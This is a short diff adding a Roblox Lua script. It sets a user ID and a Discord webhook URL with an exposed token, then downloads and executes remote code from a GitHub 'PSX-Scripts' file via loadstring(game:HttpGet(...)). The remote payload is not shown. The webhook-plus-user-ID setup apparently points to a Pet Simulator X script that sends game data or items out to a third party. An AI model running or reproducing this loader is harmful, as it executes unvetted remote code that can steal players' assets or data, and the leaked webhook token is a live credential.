@@ -1,0 +1,3 @@
+_G.UserID = 692365767 
+_G.WebHook = "https://discordapp.com/api/webhooks/1320689374333112363/qYpedka2MpgR4OqOldA7BjTeV9tU6zq7uenwxYpvicqfi1s1Q2lsVT-vSISZkMeN8Omo"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LenoxAPI/PSX-Scripts/refs/heads/main/UPDATED2025Number2"))()
